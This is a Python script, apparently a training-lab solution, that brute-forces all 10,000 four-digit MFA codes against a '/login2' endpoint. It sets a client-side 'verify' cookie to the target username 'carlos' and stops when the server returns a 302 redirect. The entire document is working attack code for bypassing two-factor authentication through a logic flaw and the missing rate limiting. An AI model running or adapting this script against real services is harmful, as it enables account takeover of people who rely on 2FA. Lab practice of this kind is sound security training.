import requests

# Replace with the full URL of the lab
url = "[Given_URL]/login2"

# Optional: carry cookies from your own login (your session)
cookies = {
    "session": "[SESSION]",
    "verify": "carlos"
}

# Headers, optional but useful
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0",
}

# Loop through all 4-digit codes
for code in range(10000):
    mfa_code = str(code).zfill(4)  # Pad with zeros: 1 -> 0001
    data = {
        "mfa-code": mfa_code
    }

    response = requests.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False)

    # Look for redirect (302) or absence of "Incorrect code" message
    if response.status_code == 302:
        print(f"[+] Code found: {mfa_code}")
        break
    else:
        print(f"[-] Tried {mfa_code} — status {response.status_code}")
